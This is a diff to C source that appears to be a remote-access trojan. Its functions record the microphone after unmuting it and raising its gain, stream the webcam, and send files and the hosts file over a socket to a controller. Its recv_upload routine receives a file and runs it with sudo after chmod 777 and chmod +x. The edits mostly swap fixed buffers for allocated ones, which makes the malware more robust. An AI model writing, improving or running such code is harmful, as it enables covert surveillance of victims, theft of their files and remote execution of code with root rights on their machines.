@@ -294,8 +294,6 @@ void dispatch_modules(char *argv[])
                 perror("pthread_join");
                 return;
             }
-
-            //send_dowloaded_file();
         }
 
         if(flag == 15)
@@ -313,8 +311,6 @@ void dispatch_modules(char *argv[])
                 perror("pthread_join");
                 return;
             }
-
-            //send_dowloaded_file();
         }
 
 
@@ -356,7 +352,7 @@ void dispatch_modules(char *argv[])
         /*
         if(flag == 13)
         {
-            printf("\t\tSTREAMING STARTED....\n");
+            printf("\t\tWEBCAM STREAMING STARTED....\n");
             
             if(pthread_create(&stream_desktop, NULL, (void*(*)(void*))execute_cmd, NULL) == -1)
             {
@@ -396,11 +392,11 @@ void dispatch_modules(char *argv[])
         }
         
         if(flag == 17)
-        {
+        {            
             printf("\t\tRECORD AUDIO STARTED....\n");
             
             on_video = 0;
-
+            
             mint_gain_mic_pipe = popen(ubuntu_gain_mic_cmd, "w");
             if(mint_gain_mic_pipe == NULL)
             {
@@ -414,6 +410,7 @@ void dispatch_modules(char *argv[])
                 error("popen() mint_unmute_mic_pipe", "dispatch_modules()");
                 return;
             }
+                
 
             if(pclose(mint_unmute_mic_pipe) == -1)
             {
@@ -593,15 +590,15 @@ void recv_upload()
         return;
     }
 
-    cmd_1 = strcpy(cmd_1, "sudo chmod 777 ");
-    cmd_1 = strcat(cmd_1, log_name);
+    cmd_1 = strncpy(cmd_1, "sudo chmod 777 ", 16);
+    cmd_1 = strncat(cmd_1, log_name, strlen(log_name));
 
-    cmd_2 = strcpy(cmd_2, "sudo chmod +x ");
-    cmd_2 = strcat(cmd_2, log_name);
+    cmd_2 = strncpy(cmd_2, "sudo chmod +x ", 15);
+    cmd_2 = strncat(cmd_2, log_name, strlen(log_name));
 
-    cmd_3 = strcpy(cmd_3, "sudo ");
-    cmd_3 = strcat(cmd_3, "./");
-    cmd_3 = strcat(cmd_3, log_name);
+    cmd_3 = strncpy(cmd_3, "sudo ", 6);
+    cmd_3 = strncat(cmd_3, "./", 3);
+    cmd_3 = strncat(cmd_3, log_name, strlen(log_name));
 
     do
     {
@@ -675,7 +672,7 @@ void *send_dowloaded_file()
 
     FILE *on_download = NULL;
 
-    char buffer[BUFSIZ] = "";
+    char *buffer = NULL;
 
     long dataSend = 0;
     long dataRead = 0;
@@ -725,6 +722,13 @@ void *send_dowloaded_file()
     fseek(on_download, 0, SEEK_END);
     file_size = ftell(on_download);
     rewind(on_download);
+    
+    buffer = malloc(file_size * sizeof(char));
+    if(buffer == NULL)
+    {
+        error("malloc buffer", "send_dowloaded_binarie()");
+        pthread_exit(NULL);
+    }
 
     /** Envoie de la taille du fichier txt **/
     if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
@@ -763,6 +767,7 @@ void *send_dowloaded_file()
 
     free(fichier);
     free(file_path);
+    free(buffer);
 
     pthread_exit(NULL);
 }
@@ -774,7 +779,7 @@ void *send_dowloaded_binarie()
 
     FILE *on_download = NULL;
 
-    char buffer[BUFSIZ] = "";
+    char *buffer = NULL;
 
     long dataSend = 0;
     long dataRead = 0;
@@ -824,6 +829,13 @@ void *send_dowloaded_binarie()
     fseek(on_download, 0, SEEK_END);
     file_size = ftell(on_download);
     rewind(on_download);
+    
+    buffer = malloc(file_size * sizeof(char));
+    if(buffer == NULL)
+    {
+        error("malloc buffer", "send_dowloaded_binarie()");
+        pthread_exit(NULL);
+    }
 
     /** Envoie de la taille du fichier txt **/
     if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
@@ -862,6 +874,7 @@ void *send_dowloaded_binarie()
 
     free(fichier);
     free(file_path);
+    free(buffer);
 
     pthread_exit(NULL);
 }
@@ -873,7 +886,7 @@ void *send_hosts_file()
 
     FILE *hosts_download = NULL;
 
-    char buffer[MAXDATASIZE] = "";
+    char *buffer = NULL;
 
     long dataSend = 0;
     long dataRead = 0;
@@ -883,7 +896,7 @@ void *send_hosts_file()
     if(send(csock, (char*)&len_hosts_path, sizeof(len_hosts_path), 0) == -1)
     {
         error("send() len_hosts_path", "send_hosts_file()");
-        return 0;
+        pthread_exit(NULL);
     }
 
     printf("path len sended .... %zd\n\n", len_hosts_path);
@@ -891,7 +904,7 @@ void *send_hosts_file()
     if(send(csock, file_path, len_hosts_path, 0) == -1)
     {
         error("recv() file_path", "send_hosts_file()");
-        return 0;
+        pthread_exit(NULL);
     }
 
     printf("path sended  %s....", file_path);
@@ -900,39 +913,47 @@ void *send_hosts_file()
     if(hosts_download == NULL)
     {
         error("fopen() hosts_download", "send_hosts_file()");
-        return 0;
+        pthread_exit(NULL);
     }
 
     fseek(hosts_download, 0, SEEK_END);
     file_size = ftell(hosts_download);
     rewind(hosts_download);
+    
+    buffer = malloc(file_size * sizeof(char));
+    if(buffer == NULL)
+    {
+        error("malloc file_size", "send_hosts_file()");
+        pthread_exit(NULL);
+        
+    }
 
     /** Envoie de la taille du fichier txt **/
     if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
     {
         error("send() file_size", "send_hosts_file()");
-        return 0;
+        pthread_exit(NULL);
     }
 
     printf("weight of hosts file sended.... %ld\n\n", file_size);
 
     do
     {
-        dataRead = fread(buffer, sizeof(char), sizeof(file_size), hosts_download);
+        dataRead = fread(buffer, sizeof(char), file_size, hosts_download);
         if(dataRead < 0)
         {
             perror("fread ");
-            return 0;
+            pthread_exit(NULL);
         }
 
-        dataSend = send(csock, buffer, sizeof(file_size), 0);
+        dataSend = send(csock, buffer, file_size, 0);
 
         //printf("Envoie de %ld octets\n", dataSend);
 
         if(dataSend < 0)
         {
             perror("send() dataSend");
-            return 0;
+            pthread_exit(NULL);
         }
 
         totalSend += dataSend;
@@ -942,6 +963,8 @@ void *send_hosts_file()
     printf("File totaly send with success : %ld\n", totalSend);
 
     fclose(hosts_download);
+    
+    free(buffer);
 
     pthread_exit(NULL);
 }
@@ -1139,7 +1162,7 @@ void *execute_record_cmd()
     FILE *record_file = NULL;
     long file_weight = 0;
 
-    char buffer_record[BUFSIZ] = "";
+    char *buffer_record = NULL;
     long dataSend = 0;
     long dataRead = 0;
     long totalSend = 0;
@@ -1235,6 +1258,13 @@ void *execute_record_cmd()
     fseek(record_file, 0, SEEK_END);
     file_weight = ftell(record_file);
     rewind(record_file);
+    
+    buffer_record = malloc(file_weight * sizeof(char));
+    if(buffer_record == NULL)
+    {
+        error("malloc buffer_record", "execute_record_cmd()");
+        pthread_exit(NULL);        
+    }
 
     if(send(csock, (char*)&file_weight, sizeof(file_weight), 0) == SOCKET_ERROR)
     {
@@ -1307,7 +1337,8 @@ void *execute_record_cmd()
             pthread_exit(NULL);
         }
     }
-
+    
+    free(buffer_record);
     fclose(record_file);
     pthread_exit(NULL);
 }
